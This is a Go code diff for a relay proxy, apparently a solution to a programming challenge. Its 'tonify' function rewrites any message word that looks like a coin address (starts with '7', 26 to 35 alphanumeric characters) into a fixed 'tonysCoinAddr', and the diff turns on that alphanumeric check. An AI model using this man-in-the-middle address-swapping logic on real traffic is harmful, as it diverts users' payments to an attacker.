@@ -4,6 +4,7 @@ import (
 	"bufio"
 	"fmt"
 	"net"
+	"regexp"
 	"strings"
 )
 
@@ -60,18 +61,6 @@ func handleUpstreamConnection(upstream net.Conn) {
 	}
 }
 
-func read(r *bufio.Reader) (string, error) {
-	line, err := r.ReadString('\n')
-
-	if err == nil {
-		if line[len(line)-1] == '\n' {
-			line = line[:len(line)-1]
-		}
-	}
-
-	return line, err
-}
-
 func handleDownstreamConnection(upstream net.Conn, downstream net.Conn) {
 	defer downstream.Close()
 	defer upstream.Close()
@@ -92,14 +81,26 @@ func handleDownstreamConnection(upstream net.Conn, downstream net.Conn) {
 	}
 }
 
+func read(r *bufio.Reader) (string, error) {
+	line, err := r.ReadString('\n')
+
+	if err == nil {
+		if line[len(line)-1] == '\n' {
+			line = line[:len(line)-1]
+		}
+	}
+
+	return line, err
+}
+
 func tonify(msg string) string {
 	words := strings.Split(msg, " ")
 	for _, w := range words {
 		if len(w) > 0 && w[0] == '7' && len(w) >= 26 && len(w) <= 35 {
-			// is_alphanumeric := regexp.MustCompile(`^[a-zA-Z0-9]*$`).MatchString(w)
-			// if is_alphanumeric {
-			msg = strings.ReplaceAll(msg, w, tonysCoinAddr)
-			//}
+			is_alphanumeric := regexp.MustCompile(`^[a-zA-Z0-9]*$`).MatchString(w)
+			if is_alphanumeric {
+				msg = strings.ReplaceAll(msg, w, tonysCoinAddr)
+			}
 		}
 	}
 
